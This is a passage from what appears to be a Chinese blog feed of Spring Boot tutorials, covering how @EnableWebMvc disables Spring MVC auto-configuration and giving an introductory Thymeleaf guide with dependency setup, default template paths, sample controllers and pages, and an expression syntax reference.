class="hljs-symbol">@EnableWebMvc</span>.<br></code></pre></div></td></tr></table></figure><p>全面接管即：SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己去配置！</p><p>只需在我们的配置类中要加一个@EnableWebMvc。</p><p>我们看下如果我们全面接管了SpringMVC了，我们之前SpringBoot给我们配置的静态资源映射一定会无效，我们可以去测试一下；</p><p>不加注解之前，访问首页：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6ic2wzwiaMd6YwOHuK1fcn3ibhuXD60XiarS9NLdTIDJJicFZJt1wQ0ibuUxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>给配置类加上注解：@EnableWebMvc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp68kRH4rPKMyhAdkIL46HW90qsSoyMcNibRxDbfu7iboWM6AMRr5tFSicPA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们发现所有的SpringMVC自动配置都失效了！回归到了最初的样子；</p><p><strong>当然，我们开发中，不推荐使用全面接管SpringMVC</strong></p><p>思考问题？为什么加了一个注解，自动配置就失效了！我们看下源码：</p><p>1、这里发现它是导入了一个类，我们可以继续进去看</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;DelegatingWebMvcConfiguration.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableWebMvc &#123;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、它继承了一个父类 WebMvcConfigurationSupport</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebMvcConfigurationSupport</span> </span>&#123; <br>    <span class="hljs-comment">// ......</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、我们来回顾一下Webmvc自动配置类</p><ul><li>总结一句话：@EnableWebMvc将WebMvcConfigurationSupport组件导入进来了；</li></ul><p>而导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能！</p><p><strong>在SpringBoot中会有非常多的扩展配置，只要看见了这个，我们就应该多留心注意~</strong></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thymeleaf模板引擎</title>
    <link href="/2021/04/12/SpringBoot/Thymeleaf%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/"/>
    <url>/2021/04/12/SpringBoot/Thymeleaf%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>前端交给我们的页面，是html页面。如果是我们以前开发，我们需要把他们转成jsp页面，jsp好处就是当我们查出一些数据转发到JSP页面以后，我们可以用jsp轻松实现数据的显示，及交互等。</p><p>jsp支持非常强大的功能，包括能写Java代码，但是呢，我们现在的这种情况，SpringBoot这个项目首先是以jar的方式，不是war，像第二，我们用的还是嵌入式的Tomcat，所以呢，<strong>他现在默认是不支持jsp的</strong>。</p><p>那不支持jsp，如果我们直接用纯静态页面的方式，那给我们开发会带来非常大的麻烦，那怎么办呢？</p><p><strong>SpringBoot推荐你可以来使用模板引擎：</strong></p><p>模板引擎，我们其实大家听到很多，其实jsp就是一个模板引擎，还有用的比较多的freemarker，包括SpringBoot给我们推荐的Thymeleaf，模板引擎有非常多，但再多的模板引擎，他们的思想都是一样的，什么样一个思想呢我们来看一下这张图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6V42bcomyzTYY0q6ic7AB8lvciaoicxyalNYQYZgslIrIjdXWLFNcOxUmQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>模板引擎的作用就是我们来写一个页面模板，比如有些值呢，是动态的，我们写一些表达式。而这些值，从哪来呢，就是我们在后台封装一些数据。然后把这个模板和这个数据交给我们模板引擎，模板引擎按照我们这个数据帮你把这表达式解析、填充到我们指定的位置，然后把这个数据最终生成一个我们想要的内容给我们写出去，这就是我们这个模板引擎，不管是jsp还是其他模板引擎，都是这个思想。只不过呢，就是说不同模板引擎之间，他们可能这个语法有点不一样。其他的我就不介绍了，我主要来介绍一下SpringBoot给我们推荐的Thymeleaf模板引擎，这模板引擎呢，是一个高级语言的模板引擎，他的这个语法更简单。而且呢，功能更强大。</p><p>我们呢，就来看一下这个模板引擎，那既然要看这个模板引擎。首先，我们来看SpringBoot里边怎么用。</p><h2 id="引入Thymeleaf"><a href="#引入Thymeleaf" class="headerlink" title="引入Thymeleaf"></a>引入Thymeleaf</h2><p>怎么引入呢，对于springboot来说，什么事情不都是一个start的事情嘛，我们去在项目中引入一下。给大家三个网址：</p><p>Thymeleaf 官网：<a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a></p><p>Thymeleaf 在Github 的主页：<a href="https://github.com/thymeleaf/thymeleaf">https://github.com/thymeleaf/thymeleaf</a></p><p>Spring官方文档：找到我们对应的版本</p><p><a href="https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter">https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter</a> </p><p>找到对应的pom依赖：可以适当点进源码看下本来的包！</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--thymeleaf--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Maven会自动下载jar包，我们可以去看下下载的东西；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6o4dAJHKh0872nmgaPYMaQDJ8KWfHJYWyoMXHW2pmVOtLVnREViaTziaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="Thymeleaf分析"><a href="#Thymeleaf分析" class="headerlink" title="Thymeleaf分析"></a>Thymeleaf分析</h2><p>前面呢，我们已经引入了Thymeleaf，那这个要怎么使用呢？</p><p>我们首先得按照SpringBoot的自动配置原理看一下我们这个Thymeleaf的自动配置规则，在按照那个规则，我们进行使用。</p><p>我们去找一下Thymeleaf的自动配置类：ThymeleafProperties</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(    prefix = &quot;spring.thymeleaf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThymeleafProperties</span> </span>&#123;   <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Charset DEFAULT_ENCODING;   <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DEFAULT_PREFIX = <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;   <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DEFAULT_SUFFIX = <span class="hljs-string">&quot;.html&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> checkTemplate = <span class="hljs-keyword">true</span>;   <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> checkTemplateLocation = <span class="hljs-keyword">true</span>;   <br>    <span class="hljs-keyword">private</span> String prefix = <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;   <br>    <span class="hljs-keyword">private</span> String suffix = <span class="hljs-string">&quot;.html&quot;</span>;  <br>    <span class="hljs-keyword">private</span> String mode = <span class="hljs-string">&quot;HTML&quot;</span>;    <br>    <span class="hljs-keyword">private</span> Charset encoding;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们可以在其中看到默认的前缀和后缀！</p><p>我们只需要把我们的html页面放在类路径下的templates下，thymeleaf就可以帮我们自动渲染了。</p><p>使用thymeleaf什么都不需要配置，只需要将他放在指定的文件夹下即可！</p><p><strong>测试</strong></p><p>1、编写一个TestController</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Controllerpublic</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestController</span> </span>&#123;   <br>    <span class="hljs-meta">@RequestMapping(&quot;/t1&quot;)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">test1</span><span class="hljs-params">()</span></span>&#123;    <br>        <span class="hljs-comment">//classpath:/templates/test.html     </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;  <br>    &#125;    <br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、编写一个测试页面  test.html 放在 templates 目录下</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>   <br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>测试页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>3、启动项目请求测试</p><h2 id="Thymeleaf-语法学习"><a href="#Thymeleaf-语法学习" class="headerlink" title="Thymeleaf 语法学习"></a>Thymeleaf 语法学习</h2><p>要学习语法，还是参考官网文档最为准确，我们找到对应的版本看一下；</p><p>Thymeleaf 官网：<a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a> ， 简单看一下官网！我们去下载Thymeleaf的官方文档！</p><p><strong>我们做个最简单的练习 ：我们需要查出一些数据，在页面中展示</strong></p><p>1、修改测试请求，增加数据传输；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/t1&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">test1</span><span class="hljs-params">(Model model)</span></span>&#123;  <br>    <span class="hljs-comment">//存入数据</span><br>    model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;Hello,Thymeleaf&quot;</span>);   <br>    <span class="hljs-comment">//classpath:/templates/test.html  </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、我们要使用thymeleaf，需要在html文件中导入命名空间的约束，方便提示。</p><p>我们可以去官方文档的#3中看一下命名空间拿来过来：</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">xmlns:</span>th=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span><br></code></pre></div></td></tr></table></figure><p>3、我们去编写下前端页面</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>   <br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>狂神说<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>测试页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-comment">&lt;!--th:text就是将div中的内容设置为它指定的值，和之前学习的Vue一样--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>4、启动测试！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6ia0fYFrNsXdHekjLfPlq4ZMpF0rtPzFRBTWsw6K8zic3ywna1LgcM6Gw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>OK，入门搞定，我们来认真研习一下Thymeleaf的使用语法！</strong></p><p><strong>1、我们可以使用任意的 th:attr 来替换Html中原生属性的值！</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6fGYIwv043icVDYuybRJDCGTSNTMEibFzzMdlKS4t07TQoicQJKQAe0slQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>2、我们能写哪些表达式呢？</strong></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Simple expressions:</span> <span class="hljs-string">（表达式语法）</span><br><span class="hljs-attr">Variable Expressions:</span> <span class="hljs-string">$&#123;...&#125;：</span> <span class="hljs-string">获取变量值；OGNL；</span>   <br><span class="hljs-number">1</span><span class="hljs-string">）、获取对象的属性、调用方法</span>  <br><span class="hljs-number">2</span><span class="hljs-string">）、使用内置的基本对象：#18</span>       <br><span class="hljs-comment">#ctx : the context object.        </span><br><span class="hljs-comment">#vars: the context variables.      </span><br><span class="hljs-comment">#locale : the context locale.     </span><br><span class="hljs-comment">#request : (only in Web Contexts) the HttpServletRequest object.     </span><br><span class="hljs-comment">#response : (only in Web Contexts) the HttpServletResponse object.     </span><br><span class="hljs-comment">#session : (only in Web Contexts) the HttpSession object.     </span><br><span class="hljs-comment">#servletContext : (only in Web Contexts) the ServletContext object.</span><br>    <span class="hljs-number">3</span><span class="hljs-string">）、内置的一些工具对象：</span>　　　　<br>    <span class="hljs-comment">#execInfo : information about the template being processed.　　　</span><br>    <span class="hljs-comment">#uris : methods for escaping parts of URLs/URIs　　　　</span><br>    <span class="hljs-comment">#conversions : methods for executing the configured conversion service (if any).　　　</span><br>    <span class="hljs-comment">#dates : methods for java.util.Date objects: formatting, component extraction, etc.　　</span><br>    <span class="hljs-comment">#calendars : analogous to #dates , but for java.util.Calendar objects.　</span><br>    <span class="hljs-comment">#numbers : methods for formatting numeric objects.　　　</span><br>    <span class="hljs-comment">#strings : methods for String objects: contains, startsWith, prepending/appending, etc.　　　</span><br>    <span class="hljs-comment">#objects : methods for objects in general.　</span><br>    <span class="hljs-comment">#bools : methods for boolean evaluation.　　　　</span><br>    <span class="hljs-comment">#arrays : methods for arrays.　　　　</span><br>    <span class="hljs-comment">#lists : methods for lists.　　　　　</span><br>    <span class="hljs-comment">#sets : methods for sets.　　　　</span><br>    <span class="hljs-comment">#maps : methods for maps.　　　　</span><br>    <span class="hljs-comment">#aggregates : methods for creating aggregates on arrays or collections.==================================================================================</span><br>  <span class="hljs-attr">Selection Variable Expressions:</span> <span class="hljs-string">*&#123;...&#125;：选择表达式：和$&#123;&#125;在功能上是一样；</span>  <br>  <span class="hljs-attr">Message Expressions:</span> <span class="hljs-comment">#&#123;...&#125;：获取国际化内容  </span><br>  <span class="hljs-attr">Link URL Expressions:</span> <span class="hljs-string">@&#123;...&#125;：定义URL；</span> <br>  <span class="hljs-attr">Fragment Expressions:</span> <span class="hljs-string">~&#123;...&#125;：片段引用表达式</span><br><span class="hljs-string">Literals（字面量）</span>      <br><span class="hljs-attr">Text literals:</span> <span class="hljs-string">&#x27;one text&#x27;</span> <span class="hljs-string">,</span> <span class="hljs-string">&#x27;Another one!&#x27;</span> <span class="hljs-string">,…</span>  <br>    <span class="hljs-attr">Number literals:</span> <span class="hljs-number">0</span> <span class="hljs-string">,</span> <span class="hljs-number">34</span> <span class="hljs-string">,</span> <span class="hljs-number">3.0</span> <span class="hljs-string">,</span> <span class="hljs-number">12.3</span> <span class="hljs-string">,…</span>   <br>    <span class="hljs-attr">Boolean literals:</span> <span class="hljs-literal">true</span> <span class="hljs-string">,</span> <span class="hljs-literal">false</span>   <br>    <span class="hljs-attr">Null literal:</span> <span class="hljs-literal">null</span>     <br>    <span class="hljs-attr">Literal tokens:</span> <span class="hljs-string">one</span> <span class="hljs-string">,</span> <span class="hljs-string">sometext</span> <span class="hljs-string">,</span> <span class="hljs-string">main</span> <span class="hljs-string">,…</span>     <br><span class="hljs-string">Text</span> <span class="hljs-string">operations:（文本操作）</span><br><span class="hljs-attr">String concatenation:</span> <span class="hljs-string">+</span>   <br>    <span class="hljs-attr">Literal substitutions:</span> <span class="hljs-string">|The</span> <span class="hljs-string">name</span> <span class="hljs-string">is</span> <span class="hljs-string">$&#123;name&#125;|</span>   <br><span class="hljs-string">Arithmetic</span> <span class="hljs-string">operations:（数学运算）</span>   <br><span class="hljs-attr">Binary operators:</span> <span class="hljs-string">+</span> <span class="hljs-string">,</span> <span class="hljs-bullet">-</span> <span class="hljs-string">,</span> <span class="hljs-string">*</span> <span class="hljs-string">,</span> <span class="hljs-string">/</span> <span class="hljs-string">,</span> <span class="hljs-string">%</span>  <br>    <span class="hljs-string">Minus</span> <span class="hljs-string">sign</span> <span class="hljs-string">(unary</span> <span class="hljs-string">operator):</span> <span class="hljs-bullet">-</span>   <br><span class="hljs-string">Boolean</span> <span class="hljs-string">operations:（布尔运算）</span>   <br><span class="hljs-attr">Binary operators:</span> <span class="hljs-string">and</span> <span class="hljs-string">,</span> <span class="hljs-string">or</span>   <br>    <span class="hljs-string">Boolean</span> <span class="hljs-string">negation</span> <span class="hljs-string">(unary</span> <span class="hljs-string">operator):</span> <span class="hljs-string">!</span> <span class="hljs-string">,</span> <span class="hljs-string">not</span>   <br><span class="hljs-string">Comparisons</span> <span class="hljs-string">and</span> <span class="hljs-string">equality:（比较运算）</span>  <br><span class="hljs-attr">Comparators:</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">,</span> <span class="hljs-string">&lt;</span> <span class="hljs-string">,</span> <span class="hljs-string">&gt;=</span> <span class="hljs-string">,</span> <span class="hljs-string">&lt;=</span> <span class="hljs-string">(</span> <span class="hljs-string">gt</span> <span class="hljs-string">,</span> <span class="hljs-string">lt</span> <span class="hljs-string">,</span> <span class="hljs-string">ge</span> <span class="hljs-string">,</span> <span class="hljs-string">le</span> <span class="hljs-string">)</span>   <br>    <span class="hljs-attr">Equality operators:</span> <span class="hljs-string">==</span> <span class="hljs-string">,</span> <span class="hljs-type">!=</span> <span class="hljs-string">(</span> <span class="hljs-string">eq</span> <span class="hljs-string">,</span> <span class="hljs-string">ne</span> <span class="hljs-string">)</span>  <br><span class="hljs-string">Conditional</span> <span class="hljs-string">operators:条件运算（三元运算符）</span>   <br><span class="hljs-attr">If-then:</span> <span class="hljs-string">(if)</span> <span class="hljs-string">?</span> <span class="hljs-string">(then)</span>   <br>    <span class="hljs-attr">If-then-else:</span> <span class="hljs-string">(if)</span> <span class="hljs-string">?</span> <span class="hljs-string">(then)</span> <span class="hljs-string">:</span> <span class="hljs-string">(else)</span>  <br>    <span class="hljs-attr">Default:</span> <span class="hljs-string">(value)</span> <span class="hljs-string">?:</span> <span class="hljs-string">(defaultvalue)</span>  <br><span class="hljs-attr">Special tokens:</span>   <br><span class="hljs-attr">No-Operation:</span> <span class="hljs-string">_</span><br></code></pre></div></td></tr></table></figure><p><strong>练习测试：</strong></p><p>1、 我们编写一个Controller，放一些数据</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/t2&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">test2</span><span class="hljs-params">(Map&lt;String,Object&gt; map)</span></span>&#123;  <br>    <span class="hljs-comment">//存入数据   </span><br>    map.put(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;</span>);  <br>    map.put(<span class="hljs-string">&quot;users&quot;</span>, Arrays.asList(<span class="hljs-string">&quot;qinjiang&quot;</span>,<span class="hljs-string">&quot;kuangshen&quot;</span>)); <br>    <span class="hljs-comment">//classpath:/templates/test.html    </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、测试页面取出数据</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>狂神说<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>测试页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--不转义--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:utext</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--遍历数据--&gt;</span><br>        <span class="hljs-comment">&lt;!--th:each每次遍历都会生成当前这个标签：官网#9--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user :$&#123;users&#125;&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>  <br>            <span class="hljs-comment">&lt;!--行内写法：官网#12--&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user:$&#123;users&#125;&quot;</span>&gt;</span>[[$&#123;user&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span 